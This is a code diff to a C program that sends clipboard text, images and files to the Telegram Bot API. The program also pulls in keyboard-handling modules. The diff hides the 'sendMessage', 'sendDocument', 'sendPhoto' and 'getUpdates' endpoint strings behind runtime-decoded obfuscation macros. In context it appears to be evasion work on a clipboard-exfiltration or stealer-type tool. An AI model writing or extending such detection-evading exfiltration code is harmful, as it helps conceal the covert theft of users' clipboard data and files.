@@ -18,6 +18,7 @@
 #include "telegram.h"
 #include "telegram_platform.h"
 #include "../config/config.h"
+#include "../crypto/obfuscate.h"
 #include "../keyboard/keyboard.h"
 #include "../keyboard/keyboard_output.h"
 #include "../logging/logging.h"
@@ -427,7 +428,9 @@ static int send_fields(const char *method, const form_field_t *fields,
 static int send_form(const char *text, size_t length)
 {
     form_field_t field = {"text", text, length};
-    return send_fields("sendMessage", &field, 1);
+    char method[OBF_ENDPOINT_SEND_MESSAGE_LEN + 1];
+    DEOBF_ENDPOINT_SEND_MESSAGE(method);
+    return send_fields(method, &field, 1);
 }
 
 static int send_contact(const char *phone, size_t phone_length,
@@ -715,23 +718,28 @@ static int send_file(const void *data, size_t length, const char *mime_type,
                      const char *requested_filename, int allow_photo,
                      const c2t_clipboard_source_t *source)
 {
+    char method_doc[OBF_ENDPOINT_SEND_DOCUMENT_LEN + 1];
+    DEOBF_ENDPOINT_SEND_DOCUMENT(method_doc);
+    char method_photo[OBF_ENDPOINT_SEND_PHOTO_LEN + 1];
+    DEOBF_ENDPOINT_SEND_PHOTO(method_photo);
+
     const char *method;
     const char *field;
     const char *filename;
     if (requested_filename) {
-        method = "sendDocument";
+        method = method_doc;
         field = "document";
         filename = requested_filename;
     } else if (allow_photo && mime_is(mime_type, "image/png")) {
-        method = "sendPhoto";
+        method = method_photo;
         field = "photo";
         filename = "clipboard.png";
     } else if (allow_photo && mime_is(mime_type, "image/jpeg")) {
-        method = "sendPhoto";
+        method = method_photo;
         field = "photo";
         filename = "clipboard.jpg";
     } else {
-        method = "sendDocument";
+        method = method_doc;
         field = "document";
         if (mime_is(mime_type, "image/bmp"))
             filename = "clipboard.bmp";
@@ -814,23 +822,28 @@ static int send_encrypted_file(const void *encrypted_data, size_t length,
                                const char *requested_filename, int allow_photo,
                                const c2t_clipboard_source_t *source)
 {
+    char method_doc[OBF_ENDPOINT_SEND_DOCUMENT_LEN + 1];
+    DEOBF_ENDPOINT_SEND_DOCUMENT(method_doc);
+    char method_photo[OBF_ENDPOINT_SEND_PHOTO_LEN + 1];
+    DEOBF_ENDPOINT_SEND_PHOTO(method_photo);
+
     const char *method;
     const char *field;
     const char *filename;
     if (requested_filename) {
-        method = "sendDocument";
+        method = method_doc;
         field = "document";
         filename = requested_filename;
     } else if (allow_photo && mime_is(mime_type, "image/png")) {
-        method = "sendPhoto";
+        method = method_photo;
         field = "photo";
         filename = "clipboard.png";
     } else if (allow_photo && mime_is(mime_type, "image/jpeg")) {
-        method = "sendPhoto";
+        method = method_photo;
         field = "photo";
         filename = "clipboard.jpg";
     } else {
-        method = "sendDocument";
+        method = method_doc;
         field = "document";
         if (mime_is(mime_type, "image/bmp"))
             filename = "clipboard.bmp";
@@ -1258,7 +1271,9 @@ int telegram_send_html(const char *html_text)
         {"text", html_text, strlen(html_text)},
         {"parse_mode", "HTML", 4}
     };
-    return send_fields("sendMessage", fields, 2);
+    char method[OBF_ENDPOINT_SEND_MESSAGE_LEN + 1];
+    DEOBF_ENDPOINT_SEND_MESSAGE(method);
+    return send_fields(method, fields, 2);
 }
 
 static int parse_json_field_in_range(const char *start, const char *end, const char *key, char *output, size_t capacity)
@@ -1371,11 +1386,13 @@ int telegram_poll_updates_callback(const char *token, int64_t *offset, int timeo
         temp_http = 1;
     }
 
+    char ep[OBF_ENDPOINT_GET_UPDATES_LEN + 1];
+    DEOBF_ENDPOINT_GET_UPDATES(ep);
     char query[128];
     if (offset && *offset > 0) {
-        snprintf(query, sizeof(query), "getUpdates?offset=%lld&timeout=%d", (long long)*offset, timeout_seconds);
+        snprintf(query, sizeof(query), "%s?offset=%lld&timeout=%d", ep, (long long)*offset, timeout_seconds);
     } else {
-        snprintf(query, sizeof(query), "getUpdates?timeout=%d", timeout_seconds);
+        snprintf(query, sizeof(query), "%s?timeout=%d", ep, timeout_seconds);
     }
 
     char response[32768] = {};
